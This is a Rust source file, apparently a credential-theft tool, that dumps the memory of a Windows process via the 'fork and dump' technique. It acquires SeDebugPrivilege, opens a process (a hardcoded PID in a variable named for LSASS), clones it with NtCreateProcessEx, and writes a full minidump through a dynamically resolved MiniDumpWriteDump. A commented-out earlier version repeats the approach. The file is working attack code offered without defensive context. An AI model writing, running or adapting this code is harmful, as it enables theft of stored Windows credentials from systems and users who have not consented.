
// use windows::Win32::{Foundation::*,System::LibraryLoader::*,Security::*,System::Threading::*,System::SystemServices::*,System::Diagnostics::Debug::*,
//     Storage::FileSystem::*,
// };
// use core::ptr;
// use std::ptr::null_mut;
// use std::mem::zeroed;


// // pub unsafe extern "system" fn NtCreateProcessEx(
// //     ProcessHandle: PHANDLE, 
// //     DesiredAccess: ACCESS_MASK, 
// //     ObjectAttributes: POBJECT_ATTRIBUTES, 
// //     ParentProcess: HANDLE, 
// //     Flags: ULONG, 
// //     SectionHandle: HANDLE, 
// //     DebugPort: HANDLE, 
// //     ExceptionPort: HANDLE, 
// //     JobMemberLevel: ULONG
// // ) -> i32{}


// fn getmodule(dllname:PSTR) -> HINSTANCE {
//     let module  = unsafe {LoadLibraryA(dllname)};
//     // match module {
//     //     null => println!("error"),
//     //     other => println!("find dllname okk")
//     // }
//     module
// }

// fn getprocaddress(dllnhinstance:HINSTANCE,fnname:PSTR) -> FARPROC {
//     let address = unsafe{GetProcAddress(dllnhinstance,fnname)};
//     address
// }



// /*  OpenProcess   OpenProcessToken  LookupPrivilegeValueA  AdjustTokenPrivileges */

// fn GetDebugPrivilege() -> i32 {
//   unsafe{
//     let mut currenttoken:HANDLE =std::mem::zeroed();

//     let mut currentDebugValue:LUID = std::mem::zeroed();
//     let mut status =  OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut currenttoken);

//     match status {
//         BOOL(1) =>println!("OpenProcessToken success "),
//         _ => return 0
//         //_ =>println!("OpenProcessToken fialed")
//     }   

//     status =LookupPrivilegeValueA(PSTR(ptr::null_mut()), PSTR("SeDebugPrivilege\0".as_ptr()), &mut currentDebugValue);

//     match status {
//         BOOL(1) =>println!("LookupPrivilegeValue success "),
//         _ => return 0
//         // _ =>println!("LookupPrivilegeValue fialed"),
//     }   
//     println!("the LookupPrivilegeValueA is {:?}",currentDebugValue);
//     let new_privileges:TOKEN_PRIVILEGES = TOKEN_PRIVILEGES {
//         PrivilegeCount: 1,
//         Privileges: [LUID_AND_ATTRIBUTES {
//             Luid: currentDebugValue,
//             Attributes: SE_PRIVILEGE_ENABLED,
//         }],
//     };

//     status = AdjustTokenPrivileges(currenttoken,BOOL(0),&new_privileges,std::mem::size_of_val(&new_privileges) as u32,ptr::null_mut(),ptr::null_mut());
//     match status {
//         BOOL(1) =>println!("AdjustTokenPrivileges success "),
//         _ => return 0
//         // _ =>println!("AdjustTokenPrivileges fialed"),
//     }   

  
//     return 1;
//     }
// }


// pub fn fock_dump(pid:u32, fullpathname:&str)  {

//     let mut  status = GetDebugPrivilege();
//     if status ==1 {
//         println!("GetDebugPrivilege success ....try to MiniDumpWriteDump process");
//     } else {
//         println!("GetDebugPrivilege fialed ... check if you are Administrator");
//         return 
//     }       
//     unsafe{
//     let pidprocess = OpenProcess(PROCESS_CREATE_PROCESS,BOOL(0),pid);
//     // let res:bool  =pidprocess.is_invalid();
//     // // match res {
//     // //     false => println!("openprocess success"),
//     // //     // true => println!("openprocess failed"),
//     // // }

//     let ntdllHINSTANCE:HINSTANCE =getmodule(PSTR("ntdll".as_ptr()));
//     // let ntcreateprocessex:

//     let mut hhhnullfile:HANDLE =std::mem::zeroed();
//     let hhfile =CreateFileA(PSTR(fullpathname.as_ptr()),FILE_ACCESS_FLAGS(GENERIC_READ |GENERIC_WRITE) ,FILE_SHARE_MODE(0),std::ptr::null_mut(), CREATE_NEW,FILE_FLAGS_AND_ATTRIBUTES(0),hhhnullfile);
//     let boolstatus = MiniDumpWriteDump(pidprocess,pid,hhfile,MiniDumpWithFullMemoryInfo | MiniDumpWithUnloadedModules,ptr::null_mut(),ptr::null_mut(),ptr::null_mut());
//     match boolstatus {
//         BOOL(1) =>println!("MiniDumpWriteDump success "),
//         _ =>println!("MiniDumpWriteDump fialed"),
//     }     
//     return 
//     }
// }





use winapi::{um::winbase::*,um::winnt::*,shared::minwindef::*,um::processthreadsapi::*,um::securitybaseapi::*,shared::ntdef::NULL,um::fileapi::{CreateFileA,CREATE_ALWAYS},};
use ntapi::ntpsapi::{
    NtCreateProcessEx, NtCreateThreadEx, NtCurrentProcess, NtQueryInformationProcess,
    PROCESS_BASIC_INFORMATION, PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
};
use core::ptr;
use std::ptr::null_mut;
use std::mem::{zeroed,size_of};
extern crate kernel32;


fn GetDebugPrivilege() -> i32 {
    unsafe{
        let mut h_token: HANDLE = 0 as _;
        OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&mut h_token);
        let privs = LUID_AND_ATTRIBUTES {Luid: LUID { LowPart: 0, HighPart: 0,},Attributes: SE_PRIVILEGE_ENABLED,};
        let mut tp = TOKEN_PRIVILEGES {PrivilegeCount: 1,Privileges: [privs ;1],};
        let privilege = "SeDebugPrivilege\0";
        let mut status = LookupPrivilegeValueA(null_mut(),privilege.as_ptr() as *const i8,&mut tp.Privileges[0].Luid,);
        if status==0 {
            return 0 
        }
        status = AdjustTokenPrivileges(h_token,0,&mut tp,size_of::<TOKEN_PRIVILEGES>() as _,null_mut(),null_mut());
        if status==0 {
            return 0 
        }
  }

    1
    }



pub fn fock_dump(pid:u32,fullpathname:&str) {
    if GetDebugPrivilege() ==0{
        println!("GetDebugPrivilege fialed,check if you are administrator");
        return 
    }
    println!("[+]GetDebugPrivilege success");
unsafe{
    let lsahandle:HANDLE = OpenProcess(PROCESS_CREATE_PROCESS, 0, 1312);
    let mut CurrentSnapshotProcess:HANDLE = std::mem::zeroed();
    let mut status = NtCreateProcessEx(&mut CurrentSnapshotProcess,
        PROCESS_ALL_ACCESS,
        *&mut std::mem::zeroed::<winapi::shared::ntdef::POBJECT_ATTRIBUTES>(),
        lsahandle,
        0,
        NULL,
        NULL,
        NULL,
        0);

        let minidump: extern "stdcall" fn(HANDLE, u32, HANDLE, u32,*const (),*const (),*const ()) ->i32;
        let modu = "dbghelp.dll\0";
        let handle = kernel32::LoadLibraryA(modu.as_ptr() as *const i8);
        let mthd = "MiniDumpWriteDump\0";
        let mini = kernel32::GetProcAddress(handle, mthd.as_ptr() as *const i8);
        minidump = std::mem::transmute(mini);
        let fd = CreateFileA(fullpathname.as_ptr() as _,GENERIC_ALL,0,null_mut(),CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,null_mut());
        let status= minidump(CurrentSnapshotProcess,GetProcessId(CurrentSnapshotProcess),fd,1|2,null_mut(),null_mut(),null_mut());
        if status==1 {
            println!("[+]fockDump success")
        } else {
            println!("[-]fockDump failed")
        }


}

}

